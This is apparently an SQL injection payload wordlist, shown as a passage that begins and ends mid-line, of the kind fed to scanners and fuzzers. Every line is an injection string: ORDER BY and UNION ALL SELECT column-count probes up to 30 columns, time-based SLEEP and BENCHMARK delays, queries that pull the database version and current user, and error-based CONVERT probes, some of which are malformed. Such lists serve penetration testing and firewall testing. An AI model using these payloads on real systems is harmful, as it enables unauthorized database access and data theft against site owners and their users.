1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#\nORDER BY SLEEP(5)-- \nORDER BY 1,SLEEP(5)-- \nORDER BY 1,SLEEP(5),3-- \nORDER BY 1,SLEEP(5),3,4-- \nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5-- \nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6-- \nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7-- \nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8-- \nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9-- \nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10-- \nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11-- \nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12-- \nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13-- \nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14-- \nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14-- \nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15-- \nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16-- \nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17-- \nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-- \nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19-- \nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- \nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21-- \nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22-- \nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23-- \nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24-- \nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25-- \nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26-- \nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27-- \nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28-- \nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29-- \nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30-- \nUNION ALL SELECT 1\nUNION ALL SELECT 1,2\nUNION ALL SELECT 1,2,3\nUNION ALL SELECT 1,2,3,4\nUNION ALL SELECT 1,2,3,4,5\nUNION ALL SELECT 1,2,3,4,5,6\nUNION ALL SELECT 1,2,3,4,5,6,7\nUNION ALL SELECT 1,2,3,4,5,6,7,8\nUNION ALL SELECT 1,2,3,4,5,6,7,8,9\nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10\nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11\nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12\nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13\nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14\nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15\nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16\nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17\nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18\nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19\nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20\nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21\nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22\nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23\nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24\nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25\nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26\nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27\nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28\nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29\nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30\nUNION ALL SELECT 1#\nUNION ALL SELECT 1,2#\nUNION ALL SELECT 1,2,3#\nUNION ALL SELECT 1,2,3,4#\nUNION ALL SELECT 1,2,3,4,5#\nUNION ALL SELECT 1,2,3,4,5,6#\nUNION ALL SELECT 1,2,3,4,5,6,7#\nUNION ALL SELECT 1,2,3,4,5,6,7,8#\nUNION ALL SELECT 1,2,3,4,5,6,7,8,9#\nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10#\nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11#\nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12#\nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13#\nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14#\nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15#\nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16#\nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17#\nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#\nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#\nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#\nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#\nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#\nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#\nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#\nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#\nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#\nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#\nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#\nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#\nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#\nUNION ALL SELECT 1-- \nUNION ALL SELECT 1,2-- \nUNION ALL SELECT 1,2,3-- \nUNION ALL SELECT 1,2,3,4-- \nUNION ALL SELECT 1,2,3,4,5-- \nUNION ALL SELECT 1,2,3,4,5,6-- \nUNION ALL SELECT 1,2,3,4,5,6,7-- \nUNION ALL SELECT 1,2,3,4,5,6,7,8-- \nUNION ALL SELECT 1,2,3,4,5,6,7,8,9-- \nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10-- \nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11-- \nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12-- \nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13-- \nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14-- \nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15-- \nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16-- \nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17-- \nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-- \nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19-- \nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- \nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21-- \nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22-- \nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23-- \nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24-- \nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25-- \nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26-- \nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27-- \nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28-- \nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29-- \nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30-- \nUNION SELECT @@VERSION,SLEEP(5),3\nUNION SELECT @@VERSION,SLEEP(5),USER(),4\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30\nUNION SELECT @@VERSION,SLEEP(5),\"'3\nUNION SELECT @@VERSION,SLEEP(5),\"'3'\"#\nUNION SELECT @@VERSION,SLEEP(5),USER(),4#\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5#\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6#\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7#\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8#\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9#\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10#\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11#\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12#\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13#\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14#\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15#\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16#\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17#\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18#\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#\nUNION ALL SELECT USER()-- \nUNION ALL SELECT SLEEP(5)-- \nUNION ALL SELECT USER(),SLEEP(5)-- \nUNION ALL SELECT @@VERSION,USER(),SLEEP(5)-- \nUNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A'))-- \nUNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL-- \nUNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL-- \nUNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL-- \nUNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL-- \nUNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL-- \nUNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL-- \nUNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \nUNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \nUNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \nUNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \nUNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \nUNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \nUNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \nUNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \nUNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \nUNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \nUNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \nUNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \nUNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \nUNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \nUNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \nUNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \nUNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \nUNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \nUNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \nUNION ALL SELECT NULL-- \nAND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))-- \nAND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))-- \nAND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))-- \nAND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))-- \nAND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))-- \nAND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))-- \nAND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))-- \nAND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))-- \nAND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))-- \nAND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))-- \nAND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))-- \nAND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))-- \nAND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))-- \nAND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))-- \nAND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))-- \nAND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))-- \nAND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))-- \nAND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))-- \nAND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))-- \nUNION ALL SELECT NULL#\nAND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))#\nAND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))#\nAND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))#\nAND 5650=CONVERT(INT,(UNION ALL 